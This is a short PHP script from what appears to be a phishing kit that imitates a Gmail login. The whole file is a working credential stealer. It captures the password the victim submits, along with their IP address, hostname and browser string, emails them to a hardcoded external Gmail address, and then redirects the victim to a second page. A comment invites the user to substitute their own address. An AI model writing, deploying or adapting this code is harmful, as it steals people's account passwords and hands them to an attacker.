<?
    $ip = getenv("REMOTE_ADDR");
	$message .= "-------------- Gmail login  -------------\n";
	$message .= "Passrd : ".$_POST['pass']."\n";
	$message .= "-------------- IP Tracing ------------\n";
	$message .= "I      : $ip\n";
	$message .= "H    : ".gethostbyaddr($ip)."\n";
	$message .= "B : ".$_SERVER['HTTP_USER_AGENT']."\n";
	$message .= "---------- By MineHulk ---------\n";
	$subject = "$ip";
	$send = "fogliomom63@gmail.com"; //Put You Email Here
	$headers = 'From: GMResult' . "\r\n";
	mail($send,$subject,$message,$headers);
    header("Location: page2.php");?>
